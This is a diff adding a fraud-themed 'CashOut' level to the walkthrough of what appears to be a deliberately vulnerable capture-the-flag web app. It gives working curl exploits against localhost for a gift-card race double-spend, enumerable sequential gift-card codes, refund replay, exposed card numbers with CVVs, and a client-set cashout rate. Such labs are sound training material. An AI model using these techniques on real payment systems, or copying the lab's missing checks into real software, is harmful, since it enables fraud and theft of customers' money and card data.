@@ -364,3 +364,41 @@ curl -s localhost:4060/api/juicy -H 'content-type: application/json' \
 
 ## Roadmap: v2 → v11
 Threat-actor-themed escalation up to a Black-Team-grade final boss. See `BLUEPRINT.md`.
+
+---
+
+# v4 — CashOut (money & fraud)
+
+### 41. Gift-card double-spend (race / TOCTOU) · `POST /api/giftcard/redeem`
+Balance is checked, then written after an `await`. Fire concurrently to redeem past zero:
+```bash
+for i in $(seq 12); do curl -s localhost:4060/api/giftcard/redeem \
+  -H 'content-type: application/json' -d '{"code":"GIFT-1003"}' & done; wait
+# redeem_count > 1 → FLAG{lj_giftcard_race_double_spend}
+```
+
+### 42. Predictable gift-card codes · `GET /api/giftcard/balance?code=`
+Codes are sequential `GIFT-100N` — enumerate strangers' cards:
+```bash
+curl -s "localhost:4060/api/giftcard/balance?code=GIFT-1001"   # FLAG{lj_giftcard_predictable_code}
+```
+
+### 43. Refund replay · `POST /api/orders/:id/refund`
+No "already refunded" or ownership check — refund the same order forever:
+```bash
+curl -s -X POST localhost:4060/api/orders/40901/refund   # first
+curl -s -X POST localhost:4060/api/orders/40901/refund   # replay → FLAG{lj_refund_replay}
+```
+
+### 44. Saved-card exposure (sellable data) · `GET /api/payment-methods`
+Full PAN + CVV in the clear, no ownership check:
+```bash
+curl -s localhost:4060/api/payment-methods   # FLAG{lj_saved_card_exposure}
+```
+
+### 45. Points cashout — client-set rate / negative · `POST /api/points/cashout`
+Trusts a client `rate` and allows negative `points`:
+```bash
+curl -s localhost:4060/api/points/cashout -H "authorization: Bearer $TOK" \
+  -H 'content-type: application/json' -d '{"points":100,"rate":5}'   # FLAG{lj_points_rounding_abuse}
+```
